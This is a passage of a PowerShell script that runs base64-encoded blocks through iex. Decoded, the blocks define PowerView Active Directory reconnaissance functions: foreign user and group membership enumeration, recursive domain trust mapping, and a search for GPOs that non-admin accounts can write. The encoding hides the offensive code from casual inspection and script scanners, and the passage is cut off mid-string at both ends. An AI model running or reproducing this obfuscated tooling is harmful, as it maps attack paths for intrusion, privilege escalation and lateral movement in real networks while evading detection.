VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRSYXcgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgR2V0LURvbWFpblVzZXIgQFNlYXJjaGVyQXJndW1lbnRzICB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlcnNoaXAgaW4gJF8ubWVtYmVyb2YpIHsKICAgICAgICAgICAgICAgICRJbmRleCA9ICRNZW1iZXJzaGlwLkluZGV4T2YoJ0RDPScpCiAgICAgICAgICAgICAgICBpZiAoJEluZGV4KSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwRG9tYWluID0gJCgkTWVtYmVyc2hpcC5TdWJTdHJpbmcoJEluZGV4KSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICRVc2VyRGlzdGluZ3Vpc2hlZE5hbWUgPSAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICRVc2VySW5kZXggPSAkVXNlckRpc3Rpbmd1aXNoZWROYW1lLkluZGV4T2YoJ0RDPScpCiAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSAkKCRfLmRpc3Rpbmd1aXNoZWRuYW1lLlN1YlN0cmluZygkVXNlckluZGV4KSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBEb21haW4gLW5lICRVc2VyRG9tYWluKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAkTWVtYmVyc2hpcC5TcGxpdCgnLCcpWzBdLnNwbGl0KCc9JylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJFVzZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkXy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRpc3Rpbmd1aXNoZWROYW1lJyAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEb21haW4nICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERpc3Rpbmd1aXNoZWROYW1lJyAkTWVtYmVyc2hpcAogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvcmVpZ25Vc2VyJykKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkZvcmVpZ25Hcm91cE1lbWJlciB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3JlaWduR3JvdXBNZW1iZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKG1lbWJlcj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRSYXcgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJEV4Y2x1ZGVHcm91cHMgPSBAKCdVc2VycycsICdEb21haW4gVXNlcnMnLCAnR3Vlc3RzJykKICAgICAgICBHZXQtRG9tYWluR3JvdXAgQFNlYXJjaGVyQXJndW1lbnRzIHwgV2hlcmUtT2JqZWN0IHsgJEV4Y2x1ZGVHcm91cHMgLW5vdGNvbnRhaW5zICRfLnNhbWFjY291bnRuYW1lIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRHcm91cE5hbWUgPSAkXy5zYW1BY2NvdW50TmFtZQogICAgICAgICAgICAkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSA9ICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICRHcm91cERvbWFpbiA9ICRHcm91cERpc3Rpbmd1aXNoZWROYW1lLlN1YlN0cmluZygkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAkXy5tZW1iZXIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJF8uU3ViU3RyaW5nKCRfLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICBpZiAoKCRfIC1tYXRjaCAnQ049Uy0xLTUtMjEuKi0uKicpIC1vciAoJEdyb3VwRG9tYWluIC1uZSAkTWVtYmVyRG9tYWluKSkgewogICAgICAgICAgICAgICAgICAgICRNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZSA9ICRfCiAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkXy5TcGxpdCgnLCcpWzBdLnNwbGl0KCc9JylbMV0KICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEb21haW4nICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERpc3Rpbmd1aXNoZWROYW1lJyAkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRG9tYWluJyAkTWVtYmVyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkTWVtYmVyTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnICRNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvcmVpZ25Hcm91cE1lbWJlcicpCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlcgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblRydXN0TWFwcGluZyB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5UcnVzdC5ORVQnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuTERBUCcpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5UcnVzdC5BUEknKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdBUEknKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRBUEksCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ05FVCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5FVCwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnQVBJJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJFNlZW5Eb21haW5zID0gQHt9CiAgICAkRG9tYWlucyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlN0YWNrCiAgICAkRG9tYWluVHJ1c3RBcmd1bWVudHMgPSBAe30KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FQSSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snQVBJJ10gPSAkQVBJIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ05FVCddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snTkVUJ10gPSAkTkVUIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICRDdXJyZW50RG9tYWluID0gKEdldC1Eb21haW4gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLk5hbWUKICAgIH0KICAgIGVsc2UgewogICAgICAgICRDdXJyZW50RG9tYWluID0gKEdldC1Eb21haW4pLk5hbWUKICAgIH0KICAgICREb21haW5zLlB1c2goJEN1cnJlbnREb21haW4pCiAgICB3aGlsZSgkRG9tYWlucy5Db3VudCAtbmUgMCkgewogICAgICAgICREb21haW4gPSAkRG9tYWlucy5Qb3AoKQogICAgICAgIGlmICgkRG9tYWluIC1hbmQgKCREb21haW4uVHJpbSgpIC1uZSAnJykgLWFuZCAoLW5vdCAkU2VlbkRvbWFpbnMuQ29udGFpbnNLZXkoJERvbWFpbikpKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RNYXBwaW5nXSBFbnVtZXJhdGluZyB0cnVzdHMgZm9yIGRvbWFpbjogJyREb21haW4nIgogICAgICAgICAgICAkTnVsbCA9ICRTZWVuRG9tYWlucy5BZGQoJERvbWFpbiwgJycpCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgICAgICAgICAgJFRydXN0cyA9IEdldC1Eb21haW5UcnVzdCBARG9tYWluVHJ1c3RBcmd1bWVudHMKICAgICAgICAgICAgICAgIGlmICgkVHJ1c3RzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgewogICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBAKCRUcnVzdHMpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdORVQnKSB7CiAgICAgICAgICAgICAgICAgICAgJEZvcmVzdFRydXN0QXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsgJEZvcmVzdFRydXN0QXJndW1lbnRzWydGb3Jlc3QnXSA9ICRGb3Jlc3QgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRm9yZXN0VHJ1c3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICAkVHJ1c3RzICs9IEdldC1Gb3Jlc3RUcnVzdCBARm9yZXN0VHJ1c3RBcmd1bWVudHMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkVHJ1c3RzKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRUcnVzdHMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBAKCRUcnVzdHMpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUcnVzdCBpbiAkVHJ1c3RzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkVHJ1c3QuU291cmNlTmFtZSAtYW5kICRUcnVzdC5UYXJnZXROYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICREb21haW5zLlB1c2goJFRydXN0LlRhcmdldE5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVHJ1c3QKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblRydXN0TWFwcGluZ10gRXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdQT0RlbGVnYXRpb24gewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbU3RyaW5nXQogICAgICAgICRHUE9OYW1lID0gJyonLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgJEV4Y2x1c2lvbnMgPSBAKCdTWVNURU0nLCdEb21haW4gQWRtaW5zJywnRW50ZXJwcmlzZSBBZG1pbnMnKQogICAgJEZvcmVzdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEN1cnJlbnRGb3Jlc3QoKQogICAgJERvbWFpbkxpc3QgPSBAKCRGb3Jlc3QuRG9tYWlucykKICAgICREb21haW5zID0gJERvbWFpbkxpc3QgfCBmb3JlYWNoIHsgJF8uR2V0RGlyZWN0b3J5RW50cnkoKSB9CiAgICBmb3JlYWNoICgkRG9tYWluIGluICREb21haW5zKSB7CiAgICAgICAgJEZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1ncm91cFBvbGljeUNvbnRhaW5lcikoZGlzcGxheW5hbWU9JEdQT05hbWUpKSIKICAgICAgICAkU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcgogICAgICAgICRTZWFyY2hlci5TZWFyY2hSb290ID0gJERvbWFpbgogICAgICAgICRTZWFyY2hlci5GaWx0ZXIgPSAkRmlsdGVyCiAgICAgICAgJFNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJFNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCiAgICAgICAgJGxpc3RHUE8gPSAkU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgZm9yZWFjaCAoJGdwbyBpbiAkbGlzdEdQTyl7CiAgICAgICAgICAgICRBQ0wgPSAoW0FEU0ldJGdwby5wYXRoKS5PYmplY3RTZWN1cml0eS5BY2Nlc3MgfCA/IHskXy5BY3RpdmVEaXJlY3RvcnlSaWdodHMgLW1hdGNoICJXcml0ZSIgLWFuZCAkXy5BY2Nlc3NDb250cm9sVHlwZSAtZXEgIkFsbG93IiAtYW5kICAkRXhjbHVzaW9ucyAtbm90Y29udGFpbnMgJF8uSWRlbnRpdHlSZWZlcmVuY2UudG9TdHJpbmcoKS5zcGxpdCgiXCIpWzFdIC1hbmQgJF8uSWRlbnRpdHlSZWZlcmVuY2UgLW5lICJDUkVBVE9SIE9XTkVSIn0KICAgICAgICBpZiAoJEFDTCAtbmUgJG51bGwpewogICAgICAgICAgICAkR3BvQUNMID0gTmV3LU9iamVjdCBwc29iamVjdAogICAgICAgICAgICAkR3BvQUNMIHwgQWRkLU